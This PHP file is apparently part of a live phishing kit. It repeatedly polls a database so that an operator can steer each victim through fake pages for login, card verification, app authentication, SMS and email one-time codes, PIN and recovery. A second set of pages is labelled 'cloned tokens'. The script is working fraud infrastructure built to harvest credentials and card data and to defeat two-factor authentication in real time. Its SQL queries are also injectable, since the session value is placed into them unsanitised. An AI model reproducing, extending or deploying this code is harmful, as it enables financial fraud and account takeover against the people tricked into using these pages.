<?php
$session = $x;
$xyz = $url_cosmetic;
require_once '../admin/config/config.php';




function Cycle($session, $conn, $sql, $xyz){

$sql = "SELECT Next_Redirect FROM logs WHERE SessionID = '$session';";
$result = mysqli_query($conn, $sql);






if (mysqli_num_rows($result) > 0)
{
    // output data of each row
    while($row = mysqli_fetch_assoc($result))
    {
        $z = $row['Next_Redirect'];

        switch ($z)
        {

          //Main Tokens


        case 'login';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: login.php?$xyz");
                    exit();

			  break;


        case 'cc';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: ccverify.php?$xyz");
                    exit();

        break;

        case 'appauth';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: appauth.php?$xyz");
                    exit();

        break;


        case 'challenge1';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: challenge1.php?$xyz");
                    exit();

        break;


        case 'challenge2';

        $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
            mysqli_query($conn,$sqlRedirectReset);

              header("location: challenge2.php?$xyz");
              exit();

        break;


        case 'challenge3';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: challenge3.php?$xyz");
                    exit();

        break;

        case 'emailotp';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: emailotp.php?$xyz");
                    exit();

        break;

        case 'wait';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: wait.php?$xyz");
                    exit();

        break;

        case 'end';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: end.php?$xyz");
                    exit();

        break;

        case 'auth';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: auth.php?$xyz");
                    exit();

        break;

        case 'smsotp';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: smsotp.php?$xyz");
                    exit();

        break;

        case 'nip';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: pincode.php?$xyz");
                    exit();

        break;





        //Cloned Tokens


        case 'login_c';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: logintoken.php?$xyz");
                    exit();

        break;

        case 'auth_c';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: authtoken.php?$xyz");
                    exit();



                    case 'auth_c2';

                            $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                                mysqli_query($conn,$sqlRedirectReset);
                                header("location: authtoken2.php?$xyz");
                                exit();





        break;

        case 'cc_c';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: cctoken.php?$xyz");
                    exit();

        break;


        case 'token_c_a';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: a-token.php?$xyz");
                    exit();

        break;


        case 'token_c_b';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: b-token.php?$xyz");
                    exit();

        break;


        case 'waiting_c';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: wait-token.php?$xyz");
                    exit();

        break;


        case 'end_c';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: end-token.php?$xyz");
                    exit();

        break;


        case 'emailotp_c';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: emailtoken.php?$xyz");
                    exit();

        break;


        case 'sms_c';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: smstoken.php?$xyz");
                    exit();

        break;


        case 'app_c';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: apptoken.php?$xyz");
                    exit();

        break;


        case 'recovery_c';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: recovery.php?$xyz");
                    exit();

        break;


        case 'main_c';

                $sqlRedirectReset="UPDATE logs set Next_Redirect = NULL WHERE SessionID = '$session';";
                    mysqli_query($conn,$sqlRedirectReset);
                    header("location: main-token.php?$xyz");
                    exit();

        break;



//



















        }

    }


}

else
{
   //do nothing Lol
}

$t=time();

$sqlRedirectReset = "UPDATE logs SET Last_Online = '$t' WHERE SessionID = '$session';";
    mysqli_query($conn,$sqlRedirectReset);

}
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);
Cycle($session, $conn, $sql, $xyz);
sleep(1);

if ($special_lag_wait==2)
{
  $sqlRedirectReset="UPDATE logs set show_error = '1' WHERE SessionID = '$session';";
      mysqli_query($conn,$sqlRedirectReset);
  header("location:index.php");
}







?>
